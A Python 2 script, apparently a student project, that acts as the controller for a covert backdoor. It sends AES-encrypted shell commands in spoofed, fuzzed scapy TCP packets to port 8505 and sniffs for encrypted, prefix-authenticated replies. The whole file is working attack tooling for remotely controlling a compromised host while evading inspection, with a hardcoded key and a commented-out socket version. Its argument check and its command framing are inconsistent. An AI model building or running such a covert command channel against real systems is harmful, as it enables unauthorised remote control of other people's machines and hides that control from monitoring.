import socket
import sys
from scapy.all import *
from Crypto.Cipher import AES
from Crypto import Random

def usage():
    if len(sys.argv) != 2:
        print "To use: ", sys.argv[0], "[Server IP] [Server Port]"
        sys.exit()

def stopfilter(pkt):
    if ARP in pkt:
        return False
    #if there is no arp in packet
    return True

def sendCommand():
    global destIP
    global crypt
    global authPacket
    destIP = sys.argv[1]
    #destPort = sys.argv[2]
    #key to authenticating the packet
    authPacket = "Authenticate packets"
    #Encryption and decryption variables and initialization
    secretKey = "Secret key lost."
    saltySpatoon = "How tough areyou"
    crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)

    sending = True

    while True:
        if sending:
            #Prompt user for the command they want to send
            command = raw_input('Write your command: ')
            #Encrypt the command with AES encryption
            encryptedCommand = crypt.encrypt(command)
            #Create the packet and store the command in the data field
            pkt = IP(src="192.168.0.14", dst=destIP)/fuzz(TCP(dport=8505))/Raw(load=encryptedCommand)
            #Send the packet
            send(pkt)
            sending = False
        else:
            sniff(timeout=2, filter="tcp and dst port 8505", prn=receiveOutput, stop_filter=stopfilter)
            sending = True

def receiveOutput(pkt):
    global destIP
    if ARP in pkt:
        return
    elif pkt[IP].src == destIP:
        #grab the raw data
        data = pkt[Raw].load
        #Decrypt the data
        decryptedData = crypt.decrypt(data)
        #if the decrypted data is authenticated, print it
        if decryptedData.startswith(authPacket) == True:
            output = decryptedData[20:]
            #Print the output
            if output == "exit":
                sys.exit()
            else:
                print output

if __name__ == "__main__":
    usage()
    sendCommand()












# #Connection Variables
# #Will change to commandline arguments
# HOST = "127.0.0.1"
# PORT = 8509

# #Open socket and connect to server
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((HOST, PORT))

# while True:
#   #User command input to be sent tot he server
#   command = raw_input('Write your command: ')
#   #Encrypt the command as well as the packet authenticator
#   encryptedCommand = crypt.encrypt(authPacket + command)
#   #Send encrypted command to the server
#   s.sendall(encryptedCommand)
#   #Receive the data from the server
#   data = s.recv(10240)
#   #Decrypt the data from the server
#   decryptedData = crypt.decrypt(data)
    # if decryptedData.startswith(authPacket) == True:
    #   newData = decryptedData[20:]
    #   #Print the output
    #   if newData == "exit":
    #       sys.exit()
    #   else:
    #       print newData
